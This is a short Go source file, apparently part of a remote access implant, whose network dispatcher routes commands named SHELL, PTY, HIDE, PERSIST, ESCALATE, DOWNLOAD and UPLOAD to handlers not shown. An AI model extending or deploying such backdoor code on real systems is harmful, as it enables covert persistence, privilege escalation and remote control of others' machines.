package main

import (
	"bufio"
	"fmt"
	"net"
	"strings"
)

type handler func(r *bufio.Reader, conn net.Conn, arg string) error

var handlers = map[string]handler{
	"PING":      handlePing,
	"STATUS":    handleStatus,
	"INFO":      handleInfo,
	"PTY":       handlePTY,
	"HIDE":      handleHide,
	"UNHIDE":    handleUnhide,
	"PERSIST":   handlePersist,
	"UNPERSIST": handleUnpersist,
	"ESCALATE":  handleEscalate,
	"SHELL":     handleShell,
	"DOWNLOAD":  handleDownload,
	"UPLOAD":    handleUpload,
}

func dispatch(r *bufio.Reader, conn net.Conn) {
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		if cmd == "QUIT" {
			return
		}

		h, ok := handlers[cmd]
		if !ok {
			fmt.Fprintln(conn, "ERR unknown command")
			continue
		}

		if err := h(r, conn, arg); err != nil {
			return
		}
	}
}
